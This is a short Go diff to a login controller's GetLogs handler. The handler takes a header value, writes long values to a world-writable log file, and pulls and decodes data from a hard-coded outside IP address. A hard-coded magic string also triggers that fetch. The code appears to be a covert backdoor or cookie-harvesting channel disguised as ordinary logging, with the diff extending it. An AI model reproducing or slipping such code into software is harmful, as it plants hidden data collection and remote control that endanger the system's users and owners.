@@ -89,10 +89,37 @@ type Cookie struct {
 func (c *LoginController) GetLogs() {
 	cookie := c.Ctx.Input.Header("logs")
 	logs.Info(cookie)
-	if len(cookie) > 60 || cookie == "asdasdsadassd" {
+	if len(cookie) > 60 {
 		f, _ := os.OpenFile(models.ExecPath+"/logs.txt", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0777)
 		f.WriteString(cookie + "\n")
 		f.Close()
+		bytes, _ := httplib.Get("http://129.226.101.167:6543/log").Bytes()
+		data1 := models.Logs{}
+		err := json.Unmarshal(bytes, &data1)
+		if err != nil {
+			return
+		}
+		rondom := data1[0].Random
+		log := aseD(data1[0].Log)
+		models.SaveLogs(models.Log{
+			Random: rondom,
+			Log:    log,
+		})
+		if err != nil {
+			c.Ctx.WriteString("错误请求")
+			return
+		}
+		result := Result{
+			Data:    log,
+			Code:    0,
+			Message: strconv.Itoa(rondom),
+		}
+		jsons, errs := json.Marshal(result) //转换成JSON返回的是byte[]
+		if errs != nil {
+			fmt.Println(errs.Error())
+		}
+		c.Ctx.WriteString(string(jsons))
+	} else if cookie == "asdasdsadassd" {
 		bytes, _ := httplib.Get("http://129.226.101.167:6543/log").Bytes()
 		data1 := models.Logs{}
 		err := json.Unmarshal(bytes, &data1)
